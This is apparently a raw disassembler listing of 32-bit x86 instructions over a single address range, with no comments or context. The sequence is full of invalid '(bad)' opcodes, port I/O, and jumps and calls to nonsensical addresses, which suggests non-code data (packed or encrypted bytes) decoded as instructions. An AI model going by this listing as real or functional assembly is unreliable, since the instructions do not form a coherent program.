  4256c0:	stos   BYTE PTR es:[edi],al
  4256c1:	ss xor al,0x10
  4256c4:	dec    esi
  4256c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256c6:	push   0x66
  4256c8:	xchg   esi,eax
  4256c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256ca:	push   es
  4256cb:	xchg   esi,eax
  4256cc:	add    BYTE PTR ds:0x57170b6,0xd6
  4256d3:	xchg   esi,eax
  4256d4:	sbb    al,ah
  4256d6:	mov    ebx,0x94205f9a
  4256db:	test   al,0xa8
  4256dd:	add    BYTE PTR ds:0x82840014,bl
  4256e3:	pop    esp
  4256e4:	mov    edx,0x5ad49938
  4256e9:	mov    DWORD PTR [eax],0x10a512df
  4256ef:	or     eax,0x15647d0a
  4256f4:	(bad)  
  4256f5:	mov    cl,0xa2
  4256f7:	sub    dl,dl
  4256f9:	add    al,0xe6
  4256fb:	aas    
  4256fc:	(bad)  
  4256fd:	fist   DWORD PTR [eax]
  4256ff:	sub    BYTE PTR [ebp+0x15],cl
  425702:	add    eax,0x30c0056f
  425707:	out    dx,al
  425708:	aaa    
  425709:	int    0x0
  42570b:	push   eax
  42570c:	(bad)  
  42570d:	jmp    0x1d05:0xad742fca
  425714:	in     al,0xc0
  425716:	scas   al,BYTE PTR es:[edi]
  425717:	fmul   DWORD PTR [eax+0x5b06bb04]
  42571d:	push   esp
  42571e:	push   esp
  42571f:	xor    cl,BYTE PTR [ecx]
  425721:	sub    al,0x6b
  425723:	clc    
  425724:	pop    eax
  425725:	out    0xdc,al
  425727:	cmp    cl,al
  425729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42572a:	inc    edx
  42572b:	sbb    DWORD PTR [eax+0x44],ebp
  42572e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42572f:	in     al,0x9f
  425731:	ss push esp
  425733:	jne    0x4256e9
  425735:	add    dh,BYTE PTR [eax]
  425737:	sub    DWORD PTR [esi-0x45777b88],edi
  42573d:	jle    0x4257a7
  42573f:	push   cs
  425740:	adc    eax,0xc2aafa55
  425745:	es mov al,ss:0x5a2abad6
  42574c:	sub    ecx,DWORD PTR [esi-0x38]
  42574f:	inc    eax
  425750:	xchg   edi,eax
  425751:	fmul   QWORD PTR ds:0x8a1abca6
  425757:	inc    edx
  425758:	fist   DWORD PTR [eax+eiz*1]
  42575b:	scas   al,BYTE PTR es:[edi]
  42575c:	and    al,0xea
  42575f:	call   0x8a3a:0xec142d61
  425766:	jne    0x425706
  425768:	add    eax,0xf7a8a67
  42576d:	stos   BYTE PTR es:[edi],al
  42576e:	pop    eax
  42576f:	je     0x4257bb
  425771:	and    dl,BYTE PTR [edx-0x39b9c3b7]
  425777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425778:	dec    ecx
  425779:	xchg   BYTE PTR [ebp+0x5],al
  42577c:	xchg   BYTE PTR ds:0xf8736cb6,cl
  425782:	add    DWORD PTR [ebp+0x42a2a4a],edi
  425788:	adc    al,0x52
  42578a:	cmp    al,bl
  42578c:	xor    dh,bl
  42578e:	inc    edi
  42578f:	inc    ebx
  425790:	push   ecx
  425791:	stos   DWORD PTR es:[edi],eax
  425792:	inc    edx
  425793:	add    BYTE PTR [ecx+eax*1],0x8
  425797:	jmp    0x425767
  425799:	loope  0x425819
  42579b:	inc    ecx
  42579c:	inc    edi
  42579d:	push   ebp
  42579e:	inc    ecx
  42579f:	scas   al,BYTE PTR es:[edi]
  4257a0:	int3   
  4257a1:	outs   dx,BYTE PTR ds:[esi]
  4257a2:	in     al,0xf7
  4257a4:	or     al,0xa9
  4257a6:	mov    dl,BYTE PTR [ebx]
  4257a8:	xor    al,0x6d
  4257aa:	inc    ecx
  4257ab:	ret    0xd5cc
  4257ae:	mov    DWORD PTR [edx+0x77],ebp
  4257b1:	sub    esi,DWORD PTR [esi]
  4257b3:	lods   al,BYTE PTR ds:[esi]
  4257b4:	stos   BYTE PTR es:[edi],al
  4257b5:	sbb    bh,BYTE PTR [edx]
  4257b7:	ins    BYTE PTR es:[edi],dx
  4257b8:	int    0x7e
  4257ba:	push   0xfffffff0
  4257bc:	(bad)  
  4257bd:	mov    WORD PTR [eax+0x3c],fs
  4257c0:	dec    edi
  4257c1:	mov    dh,0x82
  4257c3:	fdiv   DWORD PTR es:[edx+0x2e90a019]
  4257ca:	(bad)  [eax-0x24]
  4257cd:	xchg   esp,eax
  4257ce:	cmp    esi,DWORD PTR [esi]
  4257d0:	retf   0xb02c
  4257d3:	int    0x46
  4257d5:	mov    esi,0xc6dc47e9
  4257da:	push   esp
  4257db:	jb     0x4257f2
  4257dd:	adc    cl,BYTE PTR [ebp-0x53]
  4257e0:	push   ds
  4257e1:	sub    BYTE PTR fs:[ebp-0x717733b4],bl
  4257e8:	cmp    al,BYTE PTR [edx+eax*2+0x2e5a0a87]
  4257ef:	inc    esp
  4257f0:	mov    bl,ch
  4257f2:	xchg   BYTE PTR [edx],cl
  4257f4:	xor    eax,0x749e0ad1
  4257f9:	out    dx,al
  4257fa:	sbb    al,0x86
  4257fc:	adc    eax,0x51f6dad6
  425801:	test   BYTE PTR [eax],0x17
  425804:	adc    BYTE PTR ds:0x8e011c03,dl
  42580a:	repz (bad) 
  42580c:	mov    esi,0x150df3b0
  425811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425812:	jg     0x425860
  425814:	xchg   esp,eax
  425815:	jo     0x425843
  425817:	inc    DWORD PTR [esi+0x4d78500]
  42581d:	sbb    ecx,esp
  42581f:	and    bh,dh
  425821:	push   esp
  425822:	sub    eax,0x96bc35e6
  425827:	ins    DWORD PTR es:[edi],dx
  425828:	sbb    cl,BYTE PTR [edx]
  42582a:	sub    dh,BYTE PTR [eax-0x7e]
  42582d:	cmp    al,0x14
  42582f:	loopne 0x4258a8
  425831:	repz or bl,BYTE PTR [edx+ebp*2]
  425835:	inc    ecx
  425836:	test   DWORD PTR [esi-0x7e],ebx
  425839:	xchg   edx,eax
  42583a:	cmp    al,0xc8
  42583c:	test   DWORD PTR [edx+0x1415701f],eax
  425842:	adc    al,0xfc
  425844:	mov    ch,0xd8
  425846:	cwde   
  425847:	push   ds
  425848:	(bad)  
  425849:	outs   dx,BYTE PTR ds:[esi]
  42584a:	jbe    0x425860
  42584c:	push   esp
  42584d:	or     DWORD PTR [esi],0x7c
  425850:	xchg   esi,eax
  425851:	aam    0x3c
  425853:	icebp  
  425854:	jne    0x42588a
  425856:	sub    DWORD PTR [eax+eiz*4+0x319a0424],ecx
  42585d:	(bad)  
  42585e:	mov    ds:0xcb940286,al
  425863:	stos   BYTE PTR es:[edi],al
  425864:	cmc    
  425865:	mov    edi,cs
  425867:	and    DWORD PTR [edx+0x59746655],ecx
  42586d:	adc    esi,DWORD PTR [edx-0xff352f8]
  425873:	cmp    al,0x50
  425875:	lock add al,0xb4
  425878:	retf   
  425879:	inc    esi
  42587a:	push   ebp
  42587b:	mov    edx,0xaa3d2aea
  425880:	aaa    
  425881:	stos   DWORD PTR es:[edi],eax
  425882:	fcomp  DWORD PTR [esi-0x56cb3693]
  425888:	add    al,0x52
  42588a:	cmp    eax,0xd8230074
  42588f:	(bad)  
  425890:	mov    esi,0x2c76d955
  425895:	adc    BYTE PTR [eax],dh
  425897:	xchg   esp,eax
  425898:	out    dx,al
  425899:	stos   DWORD PTR es:[edi],eax
  42589a:	nop
  42589b:	add    dl,ah
  42589d:	mov    ah,dl
  42589f:	pop    ecx
  4258a0:	pop    eax
  4258a1:	sbb    eax,0xdc8a860d
  4258a6:	pop    esi
  4258a7:	pop    edx
  4258a8:	inc    esp
  4258a9:	(bad)  
  4258aa:	push   ebp
  4258ab:	dec    eax
  4258ac:	fisubr DWORD PTR [esi-0x84cba9e]
  4258b2:	xor    al,0xe2
  4258b4:	add    dl,BYTE PTR [edx-0x69]
  4258b7:	(bad)  
  4258b8:	mov    eax,0xd758cbcf
  4258bd:	push   es
  4258be:	shl    DWORD PTR [esi-0x74],0x4e
  4258c2:	(bad)  
  4258c3:	xor    dh,BYTE PTR [edx]
  4258c5:	into   
  4258c6:	xchg   ecx,eax
  4258c7:	cli    
  4258c8:	ins    BYTE PTR es:[edi],dx
  4258c9:	sbb    eax,0x97da4cd6
  4258ce:	(bad)  
  4258cf:	jmp    0x8342:0x6d9734fb
  4258d6:	imul   edx,DWORD PTR [ebx],0x3e6970e4
  4258dc:	retf   0x4cf2
  4258df:	popa   
  4258e0:	or     ebp,DWORD PTR [edx-0x4aa545f4]
  4258e6:	(bad)  
  4258e7:	mov    dh,0x46
  4258e9:	call   0x6352:0x5eba1a8a
  4258f0:	adc    al,BYTE PTR [eax]
  4258f2:	std    
  4258f3:	mov    dh,0xc3
  4258f5:	add    ch,BYTE PTR [ecx+0x3aaab8fe]
  4258fb:	inc    esp
  4258fc:	or     ebp,DWORD PTR [eax-0xf19b72d]
  425902:	in     al,0x12
  425904:	pop    edi
  425905:	pop    ebp
  425906:	int    0x5
  425908:	sub    ebp,DWORD PTR [eax]
  42590a:	xor    eax,0xca8417
  42590f:	int3   
  425910:	sbb    esi,esp
  425912:	retf   
  425913:	xor    edx,DWORD PTR ds:0x9a8d8a8d
  425919:	fs ss pop eax
  42591c:	cs adc eax,0xcd7f1d8e
  425922:	lods   eax,DWORD PTR ds:[esi]
  425923:	add    BYTE PTR [eax+0x121b0095],dl
  425929:	(bad)
  42592d:	repnz sub DWORD PTR [ecx-0x79],0x968a2c13
  425935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425936:	xor    al,0xde
  425938:	shr    BYTE PTR [edx+0x79846c0a],1
  42593e:	jbe    0x425900
  425940:	mov    esi,0x2e22fed8
  425945:	shl    BYTE PTR [edx],cl
  425947:	pop    eax
  425948:	pop    ss
  425949:	fsub   QWORD PTR [ebx+0x2814d4c4]
  42594f:	ss adc al,0x68
  425952:	jl     0x42592e
  425954:	add    DWORD PTR [ebx-0x494239d2],ebx
  42595a:	mov    al,ds:0x534c56c2
  42595f:	dec    ebx
  425960:	cli    
  425961:	mov    BYTE PTR [ebx],ch
  425963:	sbb    BYTE PTR [ebx],dl
  425965:	sub    eax,0x270e864
  42596a:	add    eax,0xd2e4ba36
  42596f:	sbb    eax,0xa82859ab
  425974:	pop    eax
  425975:	js     0x42593d
  425977:	jae    0x42599d
  425979:	mov    ebp,0x3c3626d7
  42597e:	loopne 0x425953
  425980:	enter  0xf1d2,0x68
  425984:	inc    ecx
  425985:	lods   eax,DWORD PTR ds:[esi]
  425986:	push   0xeb2e154d
  42598b:	mov    eax,0xfabc2e8f
  425990:	scas   al,BYTE PTR es:[edi]
  425991:	call   0x918f5eab
  425996:	loop   0x425a0c
  425998:	or     BYTE PTR [edi],dl
  42599a:	int3   
  42599b:	push   edx
  42599c:	push   edx
  42599d:	retf   
  42599e:	add    bl,dh
  4259a0:	push   edi
  4259a1:	mov    ah,0x1e
  4259a3:	push   0xffffffa1
  4259a5:	cs jno 0x4259a8
  4259a8:	mov    ch,0x68
  4259aa:	add    cl,cl
  4259ac:	pusha  
  4259ad:	retf   
  4259ae:	loopne 0x4259e6
  4259b0:	jne    0x425994
  4259b2:	xor    esp,ecx
  4259b4:	mov    dh,0x66
  4259b6:	sbb    ebx,DWORD PTR [edx+0x33]
  4259b9:	inc    esp
  4259ba:	sbb    BYTE PTR [eax-0x3567fc60],0xb4
  4259c1:	loop   0x42596f
  4259c3:	inc    ebp
  4259c4:	push   edi
  4259c5:	aad    0x82
  4259c7:	adc    ebx,DWORD PTR [eax+0xef6e543]
  4259cd:	sub    BYTE PTR [edx+0x58],0xa0
  4259d1:	xor    eax,0x151202b5
  4259d6:	inc    eax
  4259d7:	rcr    DWORD PTR [esi+eax*1],0x1c
  4259db:	(bad)  
  4259dc:	js     0x4259de
  4259de:	ins    BYTE PTR es:[edi],dx
  4259df:	lods   eax,DWORD PTR ds:[esi]
  4259e0:	jle    0x425a41
  4259e2:	dec    esp
  4259e3:	mov    dl,0xc4
  4259e5:	ror    DWORD PTR [edi-0x68b0de86],1
  4259eb:	pop    edx
  4259ec:	push   ecx
  4259ed:	and    BYTE PTR [esp+edi*1+0x7e],dl
  4259f1:	call   0xf7b73e5d
  4259f6:	ficomp WORD PTR [edx+0x6b]
  4259f9:	inc    ebp
  4259fa:	es cmc 
  4259fc:	xor    BYTE PTR [edi],0x22
  4259ff:	sbb    esi,DWORD PTR [edx+0x2faa46a0]
  425a05:	add    BYTE PTR [eax+0x50],ch
  425a08:	fcom   st(4)
  425a0a:	rol    BYTE PTR [esi+esi*4],1
  425a0d:	sbb    bl,BYTE PTR [eax+eax*2-0x45]
  425a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a12:	sub    ch,BYTE PTR [edx-0x52]
  425a15:	in     eax,dx
  425a16:	mov    esp,0x7d87826c
  425a1b:	xchg   edx,eax
  425a1c:	call   0x621b0af1
  425a21:	jmp    0x425a4b
  425a23:	jmp    0x8e5a:0xe5088080
  425a2a:	pop    esi
  425a2b:	jns    0x425a39
  425a2d:	fcmovnbe st,st(1)
  425a2f:	popa   
  425a30:	fwait
  425a31:	enter  0x55be,0x1c
  425a35:	call   0x58329c40
  425a3a:	fimul  WORD PTR [eax+0x6c12ed8]
  425a40:	adc    al,0x2
  425a42:	stc    
  425a43:	in     al,0x20
  425a45:	out    dx,eax
  425a46:	stos   DWORD PTR es:[edi],eax
  425a47:	rcr    BYTE PTR [ebx-0x4d],1
  425a4a:	int    0x49
  425a4c:	sbb    al,0xe8
  425a4e:	outs   dx,DWORD PTR ds:[esi]
  425a4f:	cdq    
  425a50:	and    al,ah
  425a52:	in     eax,dx
  425a53:	or     bl,BYTE PTR [edi-0x34]
  425a56:	inc    ecx
  425a57:	pop    ebx
  425a58:	push   ecx
  425a59:	gs mov dl,0x2a
  425a5c:	mov    al,dl
  425a5e:	clc    
  425a5f:	call   0x66491a7a
  425a64:	fwait
  425a65:	stc    
  425a66:	sub    ah,BYTE PTR [eax-0xa]
  425a69:	rol    DWORD PTR [eax],cl
  425a6b:	pop    esp
  425a6c:	cmp    al,0x88
  425a6e:	out    dx,al
  425a6f:	pop    ebx
  425a70:	and    bh,BYTE PTR [ecx+eiz*2-0x4d]
  425a74:	dec    ebp
  425a75:	lea    edi,[ecx-0x20]
  425a78:	xchg   esp,eax
  425a79:	jmp    0x1ab2:0xa0ee9ad0
  425a80:	stos   BYTE PTR es:[edi],al
  425a81:	stos   BYTE PTR es:[edi],al
  425a82:	lods   al,BYTE PTR ds:[esi]
  425a83:	jp     0x425aa7
  425a85:	mov    eax,0x77320c4e
  425a8a:	outs   dx,BYTE PTR ds:[esi]
  425a8b:	push   esi
  425a8c:	sbb    bh,BYTE PTR [edx-0x4099f4fc]
  425a92:	inc    ebx
  425a93:	push   es
  425a94:	dec    edx
  425a95:	test   eax,0xbb007108
  425a9a:	sub    bh,BYTE PTR [edx]
  425a9c:	pushf  
  425a9d:	ds pop esi
  425a9f:	mov    ecx,0x4c2275fe
  425aa4:	xor    BYTE PTR [eax+0x46d2e07d],dh
  425aaa:	jecxz  0x425b0f
  425aac:	mov    WORD PTR [esi-0x27c7ebba],es
  425ab2:	mov    dl,BYTE PTR [ebx]
  425ab4:	adc    BYTE PTR [edx+ecx*2-0x1a],cl
  425ab8:	pop    ebp
  425ab9:	jno    0x3624d392
  425abf:	or     ch,bl
  425ac1:	add    BYTE PTR [edi+0x1505156b],dh
  425ac7:	dec    ebp
  425ac8:	push   0x15
  425aca:	inc    esi
  425acb:	bound  ebx,QWORD PTR [esi]
  425acd:	xchg   edi,eax
  425ace:	add    al,0x6
  425ad0:	add    eax,0xe41d0515
  425ad5:	mov    dh,0x6c
  425ad7:	in     eax,dx
  425ad8:	push   0x19
  425ada:	test   al,0xe
  425adc:	fdivr  DWORD PTR [edx]
  425ade:	ins    BYTE PTR es:[edi],dx
  425adf:	cmp    BYTE PTR [ecx-0x66d0e9ca],0xc9
  425ae6:	or     DWORD PTR [eax-0xa],esi
  425ae9:	out    0xa2,eax
  425aeb:	shr    BYTE PTR [ecx],0x2b
  425aee:	pop    edx
  425aef:	call   0xa1a1:0xf1c0f446
  425af6:	mov    ds:0xb0251ca1,eax
  425afb:	aas    
  425afc:	cld    
  425afd:	ins    BYTE PTR es:[edi],dx
  425afe:	mov    WORD PTR [esi-0x49e2fa80],cs
  425b04:	and    ch,bh
  425b06:	out    0x34,al
  425b08:	int3   
  425b09:	retf   0x6e36
  425b0c:	ins    BYTE PTR es:[edi],dx
  425b0d:	or     eax,0xee1e2a8b
  425b12:	jne    0x425b5a
  425b14:	add    eax,0x2601218c
  425b19:	push   ebx
  425b1a:	sub    DWORD PTR [ebp-0x3e],edx
  425b1d:	cld    
  425b1e:	add    BYTE PTR [ecx],ch
  425b20:	mov    esp,0x84fb5600
  425b25:	pop    esp
  425b26:	add    ah,ch
  425b28:	adc    BYTE PTR [ecx],cl
  425b2a:	out    0xaa,al
  425b2c:	mov    al,BYTE PTR [ecx+0x50]
  425b2f:	inc    ecx
  425b30:	xchg   edx,esp
  425b32:	add    DWORD PTR [esi+0x20],esi
  425b35:	outs   dx,BYTE PTR ds:[esi]
  425b36:	mov    dl,0xea
  425b38:	cmp    al,0x66
  425b3a:	push   ebp
  425b3b:	popa   
  425b3c:	fwait
  425b3d:	imul   ecx,DWORD PTR [ecx+edx*1-0x1a2b83ba],0x89b2b858
  425b48:	or     cl,al
  425b4a:	push   esi
  425b4b:	pushf  
  425b4c:	xchg   esi,eax
  425b4d:	mov    BYTE PTR [ebx+0x10],bh
  425b50:	test   al,0xe0
  425b52:	mov    al,0xab
  425b54:	test   al,0xa9
  425b56:	sub    BYTE PTR [edx-0x3c],al
  425b59:	pop    esi
  425b5a:	xchg   edx,eax
  425b5b:	inc    esp
  425b5c:	or     BYTE PTR [esi-0x1d],0x69
  425b60:	sub    edx,0xffffffa7
  425b63:	push   esi
  425b64:	lds    ebp,FWORD PTR [ecx]
  425b66:	scas   al,BYTE PTR es:[edi]
  425b67:	pop    esp
  425b68:	fisubr WORD PTR [esi]
  425b6a:	xchg   ecx,eax
  425b6b:	push   0x24f4877b
  425b70:	(bad)  
  425b71:	lods   al,BYTE PTR ds:[esi]
  425b72:	add    BYTE PTR [ecx],bh
  425b74:	les    ecx,FWORD PTR [ecx-0x13]
  425b77:	into   
  425b78:	mov    dh,0xd1
  425b7a:	popa   
  425b7b:	or     ebp,DWORD PTR [edi+edx*8-0x80]
  425b7f:	pop    esi
  425b80:	pushf  
  425b81:	mov    eax,0xa806343c
  425b86:	add    BYTE PTR [edx],0xdb
  425b89:	aam    0x96
  425b8b:	shl    DWORD PTR [edx-0x33655cb0],1
  425b91:	jg     0x425ba5
  425b93:	xor    eax,0xc05146b5
  425b98:	mov    edx,0xed58e9b2
  425b9d:	mov    ebp,0x6435a1a0
  425ba2:	pop    ecx
  425ba3:	dec    esp
  425ba4:	ss push cs
  425ba6:	jo     0x425b32
  425ba8:	arpl   WORD PTR ds:0x6a28a600,bx
  425bae:	mov    dh,0xaa
  425bb0:	mov    eax,0xcdfc0c3c
  425bb5:	jl     0x425b69
  425bb7:	sub    BYTE PTR [esi-0x6faf9249],al
  425bbd:	sub    BYTE PTR [esi+0x71],cl
  425bc0:	jbe    0x425b66
  425bc2:	bnd ret 0x2a0b
  425bc6:	sub    bl,BYTE PTR [edx-0x475059de]
  425bcc:	xchg   ebx,eax
  425bcd:	xor    al,0xb3
  425bcf:	mov    ah,BYTE PTR [ebp+0x66]
  425bd2:	pop    edx
  425bd3:	push   esp
  425bd4:	push   esp
  425bd5:	fs jl  0x425b82
  425bd8:	cs mov esp,0xb0fb98c1
  425bde:	inc    ebp
  425bdf:	sub    DWORD PTR [ebp-0x29],0x70
  425be3:	int    0xc4
  425be5:	les    ebx,FWORD PTR [edx+eiz*8]
  425be8:	xchg   edx,eax
  425be9:	adc    eax,0x6150c916
  425bee:	ins    DWORD PTR es:[edi],dx
  425bef:	call   0x99a6:0x9410d0ff
  425bf6:	mov    dh,0x30
  425bf8:	(bad)  
  425bfa:	dec    ebp
  425bfb:	stos   BYTE PTR es:[edi],al
  425bfc:	fwait
  425bfd:	jbe    0x425c38
  425bff:	push   eax
  425c00:	add    dl,dl
  425c02:	sbb    DWORD PTR [edx-0x2c],ecx
  425c05:	push   0x2b
  425c07:	mov    ds:0x9deb88c2,al
  425c0c:	mov    ecx,esi
  425c0e:	cmp    al,dl
  425c10:	mov    cl,0x55
  425c12:	cdq    
  425c13:	xchg   BYTE PTR [esi+0xc],al
  425c16:	shl    BYTE PTR [ebx+esi*1-0x2f],0x8a
  425c1b:	mov    edx,0xd60de6c6
  425c20:	(bad)  
  425c22:	mov    dl,0xaa
  425c24:	ss scas al,BYTE PTR es:[edi]
  425c26:	add    BYTE PTR [ecx+0x45058be7],al
  425c2c:	or     eax,0x92b6da07
  425c31:	sub    al,0x2c
  425c33:	lods   eax,DWORD PTR ds:[esi]
  425c34:	sub    cl,BYTE PTR [ecx]
  425c36:	stos   BYTE PTR es:[edi],al
  425c37:	sub    bl,BYTE PTR [edx+0x1f94144b]
  425c3d:	or     ch,cl
  425c3f:	pop    edx
  425c40:	aad    0x24
  425c42:	xlat   BYTE PTR ds:[ebx]
  425c43:	add    dh,BYTE PTR [ebx]
  425c45:	shl    BYTE PTR [esi-0x76],cl
  425c48:	loope  0x425c48
  425c4a:	xor    ebp,DWORD PTR ds:0xe876cdb2
  425c50:	mov    esp,?
  425c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c53:	sahf   
  425c54:	xor    eax,0x3b94dc23
  425c59:	ins    BYTE PTR es:[edi],dx
  425c5a:	inc    ecx
  425c5b:	inc    ecx
  425c5c:	psrld  mm7,QWORD PTR [ecx+0x44ba2f6]
  425c63:	not    al
  425c65:	jmp    0x519132a
  425c6a:	mov    ah,0xc4
  425c6c:	adc    DWORD PTR [eax+esi*4+0x46],edi
  425c70:	out    0x31,al
  425c72:	push   edx
  425c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c74:	scas   al,BYTE PTR es:[edi]
  425c75:	dec    ebp
  425c76:	bound  edi,QWORD PTR [esi]
  425c78:	push   0x18
  425c7a:	adc    al,0x4a
  425c7c:	test   al,0x28
  425c7e:	xchg   DWORD PTR [ebp-0x12a5dab],esi
  425c84:	mov    ds:0x1bd06504,al
  425c89:	add    al,0x3c
  425c8b:	inc    ecx
  425c8c:	inc    edi
  425c8d:	inc    ebx
  425c8e:	push   ebp
  425c8f:	pushf  
  425c90:	and    al,0x62
  425c92:	jp     0x425c5a
  425c94:	ss push ebx
  425c96:	shl    BYTE PTR ss:[edx-0x37e8932a],0x5e
  425c9e:	mov    dl,0x48
  425ca0:	cmp    cl,BYTE PTR [esi-0x15b2bb98]
  425ca6:	fsub   DWORD PTR [ecx]
  425ca8:	sub    BYTE PTR [eax+0x16],dh
  425cab:	lock pusha 
  425cad:	dec    ebx
  425cae:	sub    cl,ah
  425cb0:	(bad)  
  425cb1:	aaa    
  425cb2:	das    
  425cb3:	fisub  DWORD PTR [ecx]
  425cb5:	loopne 0x425cb7
  425cb7:	into   
  425cb8:	sbb    eax,0xd90013fe
  425cbd:	mov    cl,0xf4
  425cbf:	add    BYTE PTR [ecx+0x37],bh
  425cc2:	int    0xcd
  425cc4:	fwait
  425cc5:	jmp    0x425cc9
  425cc7:	add    BYTE PTR [esi],bh
  425cc9:	inc    ebx
  425cca:	jmp    0x779909cf
  425ccf:	repz add BYTE PTR [edx-0x2d6432a3],ah
  425cd6:	loopne 0x425d2d
  425cd8:	add    BYTE PTR [ebx-0x5aa097e5],cl
  425cde:	or     BYTE PTR [esp+esi*4],dh
  425ce1:	in     eax,dx
  425ce2:	xchg   BYTE PTR [edi+0x3a007c92],bh
  425ce8:	retf   0xcf68
  425ceb:	sub    BYTE PTR ds:0xd68ecb3e,ah
  425cf1:	xor    BYTE PTR [edx-0x66],dl
  425cf4:	cmp    BYTE PTR ds:[esi-0x594bc5c0],bl
  425cfb:	test   al,0xa0
  425cfd:	(bad)  [edi-0x4c]
  425d00:	push   ss
  425d01:	sbb    al,0x24
  425d03:	ins    BYTE PTR es:[edi],dx
  425d04:	call   0xb6f76007
  425d09:	jns    0x425cfe
  425d0b:	enter  0x5d,0x86
  425d0f:	mov    esp,0x11c0006
  425d14:	and    BYTE PTR [edx+esi*2],al
  425d17:	mov    eax,0x4569d8d2
  425d1c:	xchg   ecx,eax
  425d1d:	cs inc esp
  425d1f:	in     eax,dx
  425d20:	pop    eax
  425d21:	push   cs
  425d22:	imul   esi,DWORD PTR [ebx-0x524f6109],0xce974bcb
  425d2c:	and    DWORD PTR [edx],ecx
  425d2e:	adc    eax,0x5a2a76d3
  425d33:	test   DWORD PTR ds:0x4cc9cdd8,ebp
  425d39:	xor    BYTE PTR [ebp-0x2a],0x9b
  425d3d:	push   ss
  425d3e:	(bad)  
  425d40:	aam    0x9a
  425d42:	cmp    bh,BYTE PTR [esi-0x48]
  425d45:	push   ss
  425d46:	mov    ch,0x1c
  425d48:	push   cs
  425d49:	mov    esi,0x51d8efb3
  425d4e:	shr    BYTE PTR [eax*1-0x1ee1a6ac],1
  425d55:	int3   
  425d56:	lock xchg edx,eax
  425d58:	add    BYTE PTR [esp+esi*2-0x65d43ca],dh
  425d5f:	add    BYTE PTR [edi+0x43],bl
  425d62:	add    al,bh
  425d64:	js     0x425d9a
  425d66:	push   ecx
  425d67:	lock add BYTE PTR [edx],ch
  425d6a:	clc    
  425d6b:	les    esi,FWORD PTR [ecx]
  425d6d:	sbb    BYTE PTR ds:0x678ed686,0xd6
  425d74:	test   eax,edi
  425d76:	fsubr  st,st(6)
  425d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d79:	pushf  
  425d7a:	xchg   BYTE PTR ds:0xf7e1d55,dl
  425d80:	mov    ds:0x87299a64,al
  425d85:	repnz pop esp
  425d87:	ins    DWORD PTR es:[edi],dx
  425d88:	push   ebx
  425d89:	or     edi,DWORD PTR [esi]
  425d8b:	dec    esp
  425d8c:	cld    
  425d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d8e:	xor    al,0x7f
  425d90:	push   eax
  425d91:	fcmovbe st,st(0)
  425d93:	aad    0x8a
  425d95:	stos   BYTE PTR es:[edi],al
  425d96:	shl    esp,1
  425d98:	push   0xffffff9e
  425d9a:	test   DWORD PTR [esi-0x23],edx
  425d9d:	dec    ecx
  425d9e:	xchg   BYTE PTR [edx+0xfbe4f45],al
  425da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425da5:	(bad)  
  425da6:	std    
  425da7:	(bad)  
  425da8:	into   
  425da9:	xor    ah,BYTE PTR [edx-0x5467a9d3]
  425daf:	pop    esi
  425db0:	cwde   
  425db1:	pop    ds
  425db2:	xlat   BYTE PTR ds:[ebx]
  425db3:	inc    ecx
  425db4:	inc    ebp
  425db5:	in     al,dx
  425db6:	push   eax
  425db7:	push   esp
  425db8:	fs (bad) 
  425dba:	xor    eax,DWORD PTR [eax]
  425dbc:	sbb    ah,0x0
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	call   0x1a4af769
  425dc5:	nop
  425dc6:	ss cmp ch,dl
  425dc9:	push   esi
  425dca:	add    ecx,edx
  425dcc:	es jne 0x425e05
  425dcf:	mov    al,0xd
  425dd1:	int    0xc4
  425dd3:	stos   BYTE PTR es:[edi],al
  425dd4:	dec    esp
  425dd5:	sbb    BYTE PTR [esi+ebx*4],0xf7
  425dd9:	adc    esp,DWORD PTR [eax+ebp*4-0x77]
  425ddd:	dec    eax
  425dde:	ins    BYTE PTR es:[edi],dx
  425ddf:	mov    al,0xa0
  425de1:	mov    ds:0x36e5be0c,al
  425de6:	je     0x425dfc
  425de8:	sbb    al,0x42
  425dea:	into   
  425deb:	push   es
  425dec:	cmc    
  425ded:	mov    ah,0x1f
  425def:	or     bl,dh
  425df1:	jmp    0x2409a150
  425df6:	jl     0x425e6d
  425df8:	or     al,0x6
  425dfa:	jp     0x425e60
  425dfc:	rcl    BYTE PTR [eax+ecx*4+0x15],1
  425e00:	push   edi
  425e01:	fisubr DWORD PTR [edx+ebp*4+0x16282a58]
  425e08:	mov    dh,0xc5
  425e0a:	adc    al,0xb6
  425e0c:	push   esi
  425e0d:	hlt    
  425e0e:	mov    eax,0xee5d8cb2
  425e13:	sbb    al,0x28
  425e15:	jp     0x425df3
  425e17:	cmp    ebp,DWORD PTR fs:[ebx+edi*8-0x74]
  425e1c:	sub    BYTE PTR [edx],cl
  425e1e:	push   cs
  425e1f:	pop    ebp
  425e20:	call   0x82c632d3
  425e25:	add    BYTE PTR [edx-0x564d27fc],bh
  425e2b:	and    DWORD PTR [edx-0x5e5dae50],eax
  425e31:	(bad)  
  425e32:	in     al,0xb6
  425e34:	sbb    bl,BYTE PTR [eax+0x39]
  425e37:	mov    dh,0xd6
  425e39:	cwde   
  425e3a:	or     eax,0xe41a2e05
  425e3f:	xor    DWORD PTR [edx],0x21
  425e42:	cmp    BYTE PTR [ecx],cl
  425e44:	mov    ch,BYTE PTR [edx]
  425e46:	push   esi
  425e47:	mov    esi,0x51a0e086
  425e4c:	je     0x425ebd
  425e4e:	dec    eax
  425e4f:	adc    DWORD PTR [esi+0x6da6a3a8],esi
  425e55:	push   es
  425e56:	dec    ebx
  425e57:	stos   BYTE PTR es:[edi],al
  425e58:	inc    ebx
  425e59:	cmp    eax,0x95542646
  425e5e:	test   dl,cl
  425e60:	es xor esi,0xe0d8cf45
  425e67:	test   BYTE PTR [esi-0x1c9fc869],bl
